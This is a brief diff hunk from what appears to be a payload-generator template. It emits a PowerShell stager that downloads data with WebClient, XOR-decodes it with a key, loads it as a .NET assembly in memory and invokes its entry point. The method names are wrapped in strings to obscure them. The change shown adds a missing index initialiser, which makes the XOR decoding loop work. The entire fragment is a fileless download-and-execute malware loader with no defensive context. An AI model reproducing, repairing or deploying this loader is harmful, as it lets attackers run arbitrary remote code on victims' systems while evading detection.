@@ -103,6 +103,7 @@ ${}=[System.Text.Encoding]::ASCII.GetBytes('{}')
 function {}_Func {{
     try {{
         ${}=New-Object System.Net.WebClient
+        $i=0
         ${}=${}.$('DownloadData').Invoke(${})|%{{$_ -bxor ${}[$i++%${}.Length]}}
         ${}=[System.Reflection.Assembly]::Load($(${}))
         ${}.$('EntryPoint').$('Invoke')($null,$null)
